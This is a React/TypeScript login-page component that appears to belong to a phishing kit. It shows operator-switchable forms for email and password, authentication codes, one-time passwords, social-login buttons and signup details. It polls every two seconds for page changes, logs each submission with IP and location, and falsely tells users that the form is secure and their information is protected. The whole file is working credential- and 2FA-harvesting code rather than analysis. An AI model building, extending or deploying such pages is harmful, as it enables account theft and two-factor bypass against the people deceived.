
import React, { useEffect, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { useSessionContext } from '@/contexts/SessionContext';
import { Loader } from 'lucide-react';

const LoginPage = () => {
  const { sessionId } = useParams<{ sessionId: string }>();
  const { getSessionById, addSessionData, getMainPageById, getSubPageById } = useSessionContext();
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [session, setSession] = useState<ReturnType<typeof getSessionById>>();
  const [subPage, setSubPage] = useState<any>(null);
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    if (!sessionId) {
      setError('Invalid session ID');
      return;
    }
    
    const sessionData = getSessionById(sessionId);
    if (!sessionData) {
      setError('Session not found');
      return;
    }
    
    setSession(sessionData);
    
    // Get the current subpage details
    const mainPage = getMainPageById(sessionData.mainPageId);
    const subPage = mainPage ? 
      getSubPageById(sessionData.mainPageId, sessionData.currentSubPageId) : 
      undefined;
      
    if (subPage) {
      setSubPage(subPage);
      // Reset loading when page type changes
      setIsLoading(false);
    } else {
      setError('Page template not found');
    }
    
    // Setup polling to check for page type changes
    const intervalId = setInterval(() => {
      const updatedSession = getSessionById(sessionId);
      if (!updatedSession) return;
      
      if (
        updatedSession && 
        (updatedSession.currentSubPageId !== session?.currentSubPageId || 
         updatedSession.mainPageId !== session?.mainPageId)
      ) {
        setSession(updatedSession);
        const mainPage = getMainPageById(updatedSession.mainPageId);
        const subPage = mainPage ? 
          getSubPageById(updatedSession.mainPageId, updatedSession.currentSubPageId) : 
          undefined;
          
        if (subPage) {
          setSubPage(subPage);
          setFormData({});  // Clear form data when page type changes
          setIsLoading(false); // Reset loading when page type changes
        }
      }
    }, 2000);
    
    return () => clearInterval(intervalId);
  }, [sessionId, getSessionById, session?.currentSubPageId, session?.mainPageId, getMainPageById, getSubPageById]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!sessionId || !session) {
      setError('Session not available');
      return;
    }
    
    try {
      setIsLoading(true);
      
      // Mock geolocation data (in a real app, you'd get this from a service)
      const mockLocation = 'New York, USA';
      const mockIp = '192.168.1.' + Math.floor(Math.random() * 255);
      
      addSessionData(sessionId, {
        timestamp: new Date().toISOString(),
        ip: mockIp,
        location: mockLocation,
        formData
      });
      
      // Show loading for 1.5 seconds before showing success message
      setTimeout(() => {
        setIsLoading(false);
        setSubmitted(true);
      }, 1500);
      
      // Reset form after submission
      setFormData({});
    } catch (err) {
      setIsLoading(false);
      setError('Failed to submit data');
      console.error(err);
    }
  };

  // Custom button handler for social login buttons
  const handleSocialLogin = (provider: string) => {
    setFormData({ provider });
    handleSubmit(new Event('submit') as unknown as React.FormEvent);
  };

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center">Error</CardTitle>
          </CardHeader>
          <CardContent>
            <Alert variant="destructive">
              <AlertTitle>Something went wrong</AlertTitle>
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          </CardContent>
          <CardFooter>
            <Button className="w-full" onClick={() => navigate('/')}>
              Go to Homepage
            </Button>
          </CardFooter>
        </Card>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center">Processing</CardTitle>
          </CardHeader>
          <CardContent className="flex flex-col items-center justify-center py-8">
            <Loader className="h-12 w-12 animate-spin text-primary mb-4" />
            <p className="text-center text-muted-foreground">
              Please wait while we process your submission...
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (submitted) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center">Success!</CardTitle>
          </CardHeader>
          <CardContent>
            <Alert>
              <AlertTitle>Submission Received</AlertTitle>
              <AlertDescription>
                Your information has been successfully submitted. Thank you!
              </AlertDescription>
            </Alert>
          </CardContent>
          <CardFooter>
            <Button className="w-full" onClick={() => setSubmitted(false)}>
              Submit Another Response
            </Button>
          </CardFooter>
        </Card>
      </div>
    );
  }

  if (!session || !subPage) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md animate-pulse">
          <CardHeader>
            <div className="h-7 bg-muted rounded-md mb-2"></div>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="h-10 bg-muted rounded-md"></div>
            <div className="h-10 bg-muted rounded-md"></div>
            <div className="h-10 bg-muted rounded-md"></div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Dynamic form based on current subpage
  const renderDynamicForm = () => {
    switch (subPage.id) {
      case 'login1':
        return (
          <>
            <div className="grid gap-4">
              <div className="space-y-2">
                <Label htmlFor="email">Email</Label>
                <Input 
                  id="email" 
                  name="email" 
                  type="email" 
                  placeholder="name@example.com" 
                  required
                  value={formData.email || ''}
                  onChange={handleInputChange}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="password">Password</Label>
                <Input 
                  id="password" 
                  name="password" 
                  type="password" 
                  required
                  value={formData.password || ''}
                  onChange={handleInputChange}
                />
              </div>
              <Button type="submit" className="w-full">Sign In</Button>
            </div>
          </>
        );
      
      case 'login2':
        return (
          <>
            <div className="grid gap-4">
              <div className="space-y-2">
                <Label htmlFor="auth_code">Authentication Code</Label>
                <Input 
                  id="auth_code" 
                  name="auth_code" 
                  placeholder="Enter your auth code" 
                  required
                  value={formData.auth_code || ''}
                  onChange={handleInputChange}
                />
              </div>
              <Button type="submit" className="w-full">Verify</Button>
            </div>
          </>
        );
      
      case 'login3':
        return (
          <>
            <div className="grid gap-4">
              <div className="space-y-2">
                <Label htmlFor="otp">One-Time Password</Label>
                <Input 
                  id="otp" 
                  name="otp" 
                  placeholder="Enter the OTP sent to your device" 
                  required
                  value={formData.otp || ''}
                  onChange={handleInputChange}
                />
              </div>
              <Button type="submit" className="w-full">Verify OTP</Button>
            </div>
          </>
        );
      
      case 'login4':
        return (
          <>
            <div className="grid gap-4">
              <Button 
                type="button" 
                className="w-full bg-[#1877f2] hover:bg-[#0c63d4]"
                onClick={() => handleSocialLogin('facebook')}
              >
                Continue with Facebook
              </Button>
              <Button 
                type="button" 
                className="w-full bg-[#1da1f2] hover:bg-[#0c85d0]"
                onClick={() => handleSocialLogin('twitter')}
              >
                Continue with Twitter
              </Button>
              <Button 
                type="button" 
                className="w-full bg-[#db4437] hover:bg-[#c53727]"
                onClick={() => handleSocialLogin('google')}
              >
                Continue with Google
              </Button>
            </div>
          </>
        );

      case 'signup1':
        return (
          <>
            <div className="grid gap-4">
              <div className="space-y-2">
                <Label htmlFor="name">Full Name</Label>
                <Input 
                  id="name" 
                  name="name" 
                  type="text" 
                  placeholder="John Doe" 
                  required
                  value={formData.name || ''}
                  onChange={handleInputChange}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="email">Email</Label>
                <Input 
                  id="email" 
                  name="email" 
                  type="email" 
                  placeholder="name@example.com" 
                  required
                  value={formData.email || ''}
                  onChange={handleInputChange}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="password">Password</Label>
                <Input 
                  id="password" 
                  name="password" 
                  type="password" 
                  required
                  value={formData.password || ''}
                  onChange={handleInputChange}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="confirm_password">Confirm Password</Label>
                <Input 
                  id="confirm_password" 
                  name="confirm_password" 
                  type="password" 
                  required
                  value={formData.confirm_password || ''}
                  onChange={handleInputChange}
                />
              </div>
              <Button type="submit" className="w-full">Register</Button>
            </div>
          </>
        );
        
      case 'signup2':
        return (
          <>
            <div className="grid gap-4">
              <div className="space-y-2">
                <Label htmlFor="email">Email Address</Label>
                <Input 
                  id="email" 
                  name="email" 
                  type="email" 
                  placeholder="name@example.com" 
                  required
                  value={formData.email || ''}
                  onChange={handleInputChange}
                />
              </div>
              <Button type="submit" className="w-full">Subscribe</Button>
            </div>
          </>
        );
      
      default:
        // Generic form for any other pages
        if (subPage.fields && subPage.fields.length) {
          return (
            <div className="grid gap-4">
              {subPage.fields.map((field: string) => (
                <div key={field} className="space-y-2">
                  <Label htmlFor={field}>{field.charAt(0).toUpperCase() + field.slice(1).replace('_', ' ')}</Label>
                  <Input 
                    id={field} 
                    name={field}
                    type={field.includes('password') ? 'password' : field.includes('email') ? 'email' : 'text'}
                    required
                    value={formData[field] || ''}
                    onChange={handleInputChange}
                  />
                </div>
              ))}
              <Button type="submit" className="w-full">Submit</Button>
            </div>
          );
        }
        return <p>No form elements defined for this page.</p>;
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader>
          <CardTitle className="text-center">{subPage.name}</CardTitle>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit}>
            {renderDynamicForm()}
          </form>
        </CardContent>
        <CardFooter className="justify-center">
          <p className="text-sm text-muted-foreground">
            This is a secure form. Your information is protected.
          </p>
        </CardFooter>
      </Card>
    </div>
  );
};

export default LoginPage;
